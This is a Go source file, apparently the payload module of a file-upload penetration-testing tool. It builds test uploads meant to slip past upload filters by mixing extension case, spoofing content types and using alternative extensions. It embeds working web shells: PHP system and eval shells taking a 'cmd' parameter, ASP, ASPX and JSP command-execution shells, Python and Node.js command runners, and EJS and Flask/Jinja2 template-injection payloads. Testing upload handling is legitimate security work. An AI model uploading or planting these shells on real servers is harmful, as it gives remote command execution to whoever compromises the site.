package payload

import "strings"

// TestType categorizes the kind of upload test being performed.
type TestType string

const (
	TestTypeExtensionEvasion    TestType = "Extension Evasion"
	TestTypeContentTypeSpoof    TestType = "Content-Type Spoof"
	TestTypeMagicByteSpoof      TestType = "Magic Byte Spoof"
	TestTypeFilenameObfuscation TestType = "Filename Obfuscation"
	TestTypePathTraversal       TestType = "Path Traversal"
	TestTypeSizeBoundary        TestType = "Size Boundary"
	TestTypePolyglotArchive     TestType = "Polyglot & Archive"
	TestTypeUnicodeEncoding     TestType = "Unicode Encoding"
	TestTypeServerConfig        TestType = "Server Configuration"
)

type Payload struct {
	TestType    TestType
	Technique   string
	Filename    string
	Extension   string
	Body        []byte
	ContentType string
	Tags        []string
	GraphQL     *GraphQLFields
}

// AllPayloads generates the complete test matrix filtered by tech stack.
func AllPayloads(techStack, graphqlMutation, graphqlVariable, modulePath string, moduleOverwrite bool) []*Payload {
	var all []*Payload

	if graphqlMutation != "" {
		all = append(all, moduleGraphQLWithMutation(graphqlMutation, graphqlVariable, modulePath, techStack, moduleOverwrite)...)
		return all // Skip other payloads for targeted GraphQL testing
	}

	// Universal payloads - work on all platforms
	all = append(all, moduleC()...)       // Filename Obfuscation
	all = append(all, moduleE()...)       // Size Boundary Testing
	all = append(all, moduleG()...)       // Unicode & Encoding Attacks
	all = append(all, moduleGraphQL()...) // GraphQL File Uploads

	// Tech-specific payloads
	switch strings.ToLower(techStack) {
	case "php":
		all = append(all, moduleA()...) // PHP Extension Evasion
		all = append(all, moduleB()...) // Content-Type & Magic Bytes
		all = append(all, moduleD()...) // Path Traversal
		all = append(all, moduleF()...) // Polyglot & Archive Attacks

	case "asp.net":
		all = append(all, moduleA_ASP()...) // ASP.NET extensions only
		all = append(all, moduleB_ASP()...) // ASP.NET Content-Type spoofing
		all = append(all, moduleD()...)     // Path Traversal

	case "java":
		all = append(all, moduleA_JSP()...) // JSP extensions only
		all = append(all, moduleD()...)     // Path Traversal

	case "nodejs":
		all = append(all, moduleNodeJS()...) // Node.js specific
		all = append(all, moduleD()...)      // Path Traversal

	case "python":
		all = append(all, modulePython()...) // Python specific
		all = append(all, moduleD()...)      // Path Traversal

	default: // "all" - send everything
		all = append(all, moduleA()...) // Extension Evasion
		all = append(all, moduleB()...) // Content-Type & Magic Bytes
		all = append(all, moduleD()...) // Path Traversal
		all = append(all, moduleF()...) // Polyglot & Archive Attacks
	}

	return all
}

// Payload content definitions
var (
	phpWebshell   = []byte(`<?php system($_GET['cmd']); ?>`)
	phpEval       = []byte(`<?php eval($_POST['x']); ?>`)
	phpInfo       = []byte(`<?php phpinfo(); ?>`)
	aspShell      = []byte(`<% eval request("cmd") %>`)
	aspxShell     = []byte(`<%@ Page Language="C#"%><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>`)
	jspShell      = []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`)
	perlShell     = []byte(`#!/usr/bin/perl\nsystem($_GET['cmd']);`)
	pythonShell   = []byte(`#!/usr/bin/env python\nimport os\nos.system("id")`)
	nodeJSPayload = []byte(`require('child_process').exec('id', (err, stdout) => { console.log(stdout); });`)
	benignContent = []byte("GoUpload security test")
)

// getPayloadForExtension returns appropriate executable payload based on extension
func getPayloadForExtension(ext string) []byte {
	extLower := strings.ToLower(ext)

	if strings.Contains(extLower, ".php") || strings.Contains(extLower, ".phtml") || strings.Contains(extLower, ".phar") {
		return phpWebshell
	}
	if strings.Contains(extLower, ".asp") || strings.Contains(extLower, ".aspx") || strings.Contains(extLower, ".ashx") {
		return aspShell
	}
	if strings.Contains(extLower, ".jsp") || strings.Contains(extLower, ".jspx") {
		return jspShell
	}
	if strings.Contains(extLower, ".py") {
		return pythonShell
	}
	if strings.Contains(extLower, ".js") {
		return nodeJSPayload
	}
	return phpWebshell
}

// containsAny checks if string contains any of the substrings (case-insensitive)
func containsAny(s string, substrs ...string) bool {
	sLower := strings.ToLower(s)
	for _, sub := range substrs {
		if strings.Contains(sLower, strings.ToLower(sub)) {
			return true
		}
	}
	return false
}

// ── Tech-specific module variants ──────────────────────────────────────

// moduleA_ASP returns only ASP.NET-related extension evasion payloads
func moduleA_ASP() []*Payload {
	var tests []*Payload

	altExts := []struct {
		ext  string
		tags []string
	}{
		{".ashx", []string{"asp.net", "handler"}},
		{".asmx", []string{"asp.net", "webservice"}},
		{".asp", []string{"asp", "classic"}},
		{".aspx", []string{"asp.net", "webform"}},
		{".config", []string{"iis", "config"}},
	}

	for _, a := range altExts {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "ASP.NET extension: " + a.ext,
			Filename:  "test" + a.ext,
			Extension: a.ext,
			Body:      getPayloadForExtension(a.ext),
			Tags:      a.tags,
		})
	}

	// Case variations for ASP
	caseExts := []string{".AsP", ".AsPx", ".AsHx", ".aSpx", ".aShx"}
	for _, ext := range caseExts {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "ASP.NET case sensitivity: " + ext,
			Filename:  "test" + ext,
			Extension: ext,
			Body:      getPayloadForExtension(ext),
			Tags:      []string{"case-sensitivity", "asp.net"},
		})
	}

	return tests
}

// moduleB_ASP returns ASP.NET-specific Content-Type spoofing payloads
func moduleB_ASP() []*Payload {
	var tests []*Payload

	ctTests := []struct {
		ext         string
		spoofedType string
	}{
		{".asp", "image/jpeg"},
		{".aspx", "image/png"},
		{".ashx", "application/pdf"},
	}

	for _, ct := range ctTests {
		tests = append(tests, &Payload{
			TestType:    TestTypeContentTypeSpoof,
			Technique:   "Content-Type spoof: " + ct.ext + " as " + ct.spoofedType,
			Filename:    "upload" + ct.ext,
			Extension:   ct.ext,
			Body:        getPayloadForExtension(ct.ext),
			ContentType: ct.spoofedType,
			Tags:        []string{"content-type-spoof", ct.spoofedType, "asp.net"},
		})
	}

	return tests
}

// moduleA_JSP returns only JSP/Java-related extension evasion payloads
func moduleA_JSP() []*Payload {
	var tests []*Payload

	altExts := []struct {
		ext  string
		tags []string
	}{
		{".jsp", []string{"jsp", "java"}},
		{".jspx", []string{"jsp", "xml"}},
		{".jsw", []string{"jsp", "web"}},
		{".jsv", []string{"jsp", "view"}},
	}

	for _, a := range altExts {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "JSP extension: " + a.ext,
			Filename:  "test" + a.ext,
			Extension: a.ext,
			Body:      getPayloadForExtension(a.ext),
			Tags:      a.tags,
		})
	}

	// Case variations for JSP
	caseExts := []string{".JSP", ".JsP", ".JspX", ".jSp", ".JSPX"}
	for _, ext := range caseExts {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "JSP case sensitivity: " + ext,
			Filename:  "test" + ext,
			Extension: ext,
			Body:      getPayloadForExtension(ext),
			Tags:      []string{"case-sensitivity", "jsp"},
		})
	}

	return tests
}

// moduleNodeJS returns Node.js-specific payloads
func moduleNodeJS() []*Payload {
	var tests []*Payload

	// Node.js can execute .js files if misconfigured
	tests = append(tests, &Payload{
		TestType:  TestTypeExtensionEvasion,
		Technique: "Node.js RCE via .js upload",
		Filename:  "exploit.js",
		Extension: ".js",
		Body:      nodeJSPayload,
		Tags:      []string{"nodejs", "javascript", "rce"},
	})

	// Template injection payloads
	tests = append(tests, &Payload{
		TestType:  TestTypeExtensionEvasion,
		Technique: "Node.js EJS template injection",
		Filename:  "template.ejs",
		Extension: ".ejs",
		Body:      []byte(`<%= process.mainModule.require('child_process').execSync('id') %>`),
		Tags:      []string{"nodejs", "ejs", "ssti", "template-injection"},
	})

	return tests
}

// modulePython returns Python-specific payloads
func modulePython() []*Payload {
	var tests []*Payload

	tests = append(tests, &Payload{
		TestType:  TestTypeExtensionEvasion,
		Technique: "Python RCE via .py upload",
		Filename:  "exploit.py",
		Extension: ".py",
		Body:      pythonShell,
		Tags:      []string{"python", "rce"},
	})

	// Flask/Jinja2 template injection
	tests = append(tests, &Payload{
		TestType:  TestTypeExtensionEvasion,
		Technique: "Python Flask SSTI via upload",
		Filename:  "template.html",
		Extension: ".html",
		Body:      []byte(`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`),
		Tags:      []string{"python", "flask", "ssti", "template-injection"},
	})

	return tests
}

